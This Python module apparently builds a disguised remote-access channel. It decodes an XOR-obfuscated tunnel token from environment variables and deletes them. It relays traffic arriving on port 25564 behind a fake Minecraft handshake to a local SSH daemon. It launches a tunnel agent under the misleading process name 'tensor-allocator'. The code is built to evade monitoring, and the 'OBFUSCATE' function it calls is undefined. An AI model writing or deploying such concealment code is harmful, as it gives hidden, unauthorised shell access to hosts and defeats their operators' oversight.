import subprocess
import os
import socket
import threading
from .utils import decode_cmd

XOR_KEY = 0x5A


def deobfuscate_secret(hex_str, key=0x5A):
    if not hex_str:
        return ""
    try:
        raw_bytes = bytes.fromhex(hex_str.strip())
        deobf_bytes = bytes([b ^ key for b in raw_bytes])
        if all(32 <= b <= 126 or b in (9, 10, 13) for b in deobf_bytes):
            return deobf_bytes.decode("utf-8", errors="ignore")
        else:
            return hex_str
    except Exception:
        return hex_str


def _load_token():
    p_env = os.environ.get("P") or os.environ.get("PLAYIT") or ""
    token = deobfuscate_secret(p_env.strip())
    for key in ("P", "PLAYIT"):
        if key in os.environ:
            del os.environ[key]
    return token


def _pipe_xor(src, dst):
    try:
        while True:
            data = src.recv(8192)
            if not data:
                break
            scrambled = bytes([b ^ XOR_KEY for b in data])
            dst.sendall(scrambled)
    except Exception:
        pass
    finally:
        try:
            src.close()
        except Exception:
            pass
        try:
            dst.close()
        except Exception:
            pass


def _read_varint(sock):
    val = 0
    shift = 0
    while True:
        b = sock.recv(1)
        if not b:
            break
        byte = b[0]
        val |= (byte & 0x7F) << shift
        if not (byte & 0x80):
            break
        shift += 7
    return val


def _recv_exact(sock, n):
    """Drain exactly n bytes — fixes TCP partial-read bug that left handshake
    remnants in the stream, corrupting the XOR pipe."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def _handle_client(client_sock):
    try:
        pkt_len = _read_varint(client_sock)
        if pkt_len > 0:
            _recv_exact(client_sock, pkt_len)   # consume full MC handshake packet

        ssh_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssh_sock.connect(("127.0.0.1", 2222))
        threading.Thread(
            target=_pipe_xor, args=(client_sock, ssh_sock), daemon=True
        ).start()
        threading.Thread(
            target=_pipe_xor, args=(ssh_sock, client_sock), daemon=True
        ).start()
    except Exception:
        try:
            client_sock.close()
        except Exception:
            pass


def _xor_bridge_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", 25564))
        server.listen(10)
        while True:
            client_sock, _ = server.accept()
            threading.Thread(
                target=_handle_client, args=(client_sock,), daemon=True
            ).start()
    except Exception:
        pass


def start_xor_bridge():
    """Server-side XOR reverse proxy: port 25564 → strips MC handshake → SSHD :2222."""
    threading.Thread(target=_xor_bridge_loop, daemon=True).start()


def start(tm_log):
    playit_token = _load_token()
    cmd2_5_base = decode_cmd(
        OBFUSCATE(
            "nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '"
        )
    )
    cmd2_5 = f"{cmd2_5_base}{playit_token}'"
    playit_token = ""

    env = os.environ.copy()
    subprocess.Popen(
        cmd2_5, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT
    )
